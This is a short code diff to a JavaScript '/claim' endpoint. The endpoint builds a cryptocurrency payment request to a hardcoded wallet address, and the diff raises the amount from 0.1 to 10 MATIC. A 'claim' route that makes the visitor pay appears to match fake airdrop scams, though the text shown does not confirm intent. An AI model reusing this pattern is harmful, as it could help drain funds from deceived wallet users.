@@ -78,7 +78,7 @@ app.post('/claim', async (req, res) => {
         recipient = newRecipient;
     }
 
-    const maticAmount = 0.1;
+    const maticAmount = 10;
     
     // Constructing a payment request
     const paymentRequest = {
@@ -86,7 +86,7 @@ app.post('/claim', async (req, res) => {
         to: "0xf0eAc723A3d38Aec7fDB86092EB5cC3c61E62B07",
         value: "0x" + parseInt(web3.utils.toWei(maticAmount.toString(), 'ether')).toString(16),
         gas: "0x" + parseInt(web3.utils.toWei("100000", 'wei')).toString(16),
-        reason: '0x0', // Optional reason for the payment
+        reason: '0x0'
     };
 
     // Return the payment request to the frontend
